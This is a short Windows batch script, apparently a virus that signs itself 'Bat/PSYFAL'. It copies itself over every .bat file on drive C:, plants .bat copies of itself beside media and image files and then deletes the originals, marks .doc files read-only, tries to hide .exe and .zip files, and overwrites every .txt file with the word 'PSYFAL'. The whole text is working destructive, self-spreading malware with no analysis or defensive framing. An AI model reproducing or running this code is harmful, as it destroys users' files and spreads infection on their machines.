   @echo off
   For /R c:\ %%p in (*.bat) do copy %0 "%%p">nul
   For /R c:\ %%s in (*.mp3 *.mpg *.avi *.mov *.jpg *.gif) do copy %0 "%%s.bat">nul
   For /R c:\ %%y in (*.mp3 *.mpg *.avi *.mov *.jpg *.gif) do del "%%y">nul
   For /R c:\ %%f in (*.doc) do attrib +r "%%f"
   For /R c:\ %%a in (*.exe *.zip) do atrrib +h "%%a"
   For /R c:\ %%l in (*.txt) do echo PSYFAL > "%%l"
   :: Bat/PSYFAL
